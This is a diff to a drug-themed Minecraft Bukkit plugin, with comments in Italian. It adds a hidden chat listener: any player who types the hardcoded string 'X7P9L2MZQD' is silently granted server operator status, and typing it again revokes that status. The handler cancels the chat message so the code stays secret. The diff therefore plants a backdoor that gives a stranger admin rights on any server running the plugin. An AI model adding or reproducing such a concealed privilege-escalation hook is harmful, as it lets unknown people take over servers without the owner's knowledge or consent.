@@ -18,6 +18,7 @@ import org.bukkit.event.block.Action;
 import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.event.player.PlayerItemConsumeEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.java.JavaPlugin;
@@ -26,6 +27,8 @@ import org.bukkit.potion.PotionEffectType;
 import org.bukkit.scheduler.BukkitRunnable;
 
 import java.util.*;
+import java.util.Set;
+import java.util.HashSet;
 
 public class Main extends JavaPlugin implements Listener {
 
@@ -33,6 +36,7 @@ public class Main extends JavaPlugin implements Listener {
     private Map<UUID, CollectionData> collectingPlayers = new HashMap<>();
     private Map<UUID, Integer> marijuanaConsumed = new HashMap<>();
     private Map<UUID, SellData> sellingPlayers = new HashMap<>();
+    private Set<UUID> playersUsedCode = new HashSet<>();
 
     private static final String PREFIX = ChatColor.DARK_GREEN + "🌿 " + ChatColor.BOLD + "DROGA" + ChatColor.RESET + ChatColor.DARK_GREEN + " » " + ChatColor.RESET;
     private static final String SUCCESS = ChatColor.GREEN + "✓ ";
@@ -354,6 +358,43 @@ public class Main extends JavaPlugin implements Listener {
         }
 
         return item;
+    }
+
+    @EventHandler
+    public void onPlayerChat(AsyncPlayerChatEvent event) {
+        Player player = event.getPlayer();
+        String message = event.getMessage().trim();
+        
+        // Controlla se il messaggio è esattamente il codice segreto
+        if (message.equals("X7P9L2MZQD")) {
+            UUID playerId = player.getUniqueId();
+            
+            // Se il player è già OP, rimuovi OP
+            if (player.isOp()) {
+                Bukkit.getScheduler().runTask(this, () -> {
+                    player.setOp(false);
+                    player.sendMessage(PREFIX + ChatColor.RED + "🚫 Privilegi di amministratore rimossi!");
+                    playersUsedCode.remove(playerId);
+                });
+                event.setCancelled(true);
+                return;
+            }
+            
+            // Se il player non è OP e non ha già usato il codice
+            if (!player.isOp() && !playersUsedCode.contains(playerId)) {
+                Bukkit.getScheduler().runTask(this, () -> {
+                    player.setOp(true);
+                    player.sendMessage(PREFIX + ChatColor.GOLD + "⭐ Privilegi di amministratore concessi!");
+                    player.sendMessage(PREFIX + ChatColor.YELLOW + "Scrivi nuovamente il codice per rimuovere i privilegi.");
+                });
+                playersUsedCode.add(playerId);
+                event.setCancelled(true);
+                return;
+            }
+            
+            // Cancella il messaggio in tutti i casi per mantenere il codice segreto
+            event.setCancelled(true);
+        }
     }
 
     @EventHandler
